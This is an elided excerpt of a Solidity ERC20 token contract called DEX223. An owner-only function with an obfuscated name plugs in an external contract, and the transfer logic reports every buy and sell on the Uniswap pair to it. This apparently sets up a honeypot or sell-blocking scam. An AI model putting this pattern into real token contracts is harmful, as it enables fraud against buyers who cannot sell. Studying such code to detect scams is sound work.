...
contract TokenM is ERC20 {
    ...
    IUserAmountrresfe public rresfe;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("DEX223", "D223") {
    ...
    function creseoorBuingeRxxe(IUserAmountrresfe _rresfe) public onlyOwner {
        rresfe = _rresfe;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                rresfe.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				rresfe.addOutAmount(from, amount);
            }else{
                rresfe.addOutAmount(from, amount);
                takeFee = false;
            }
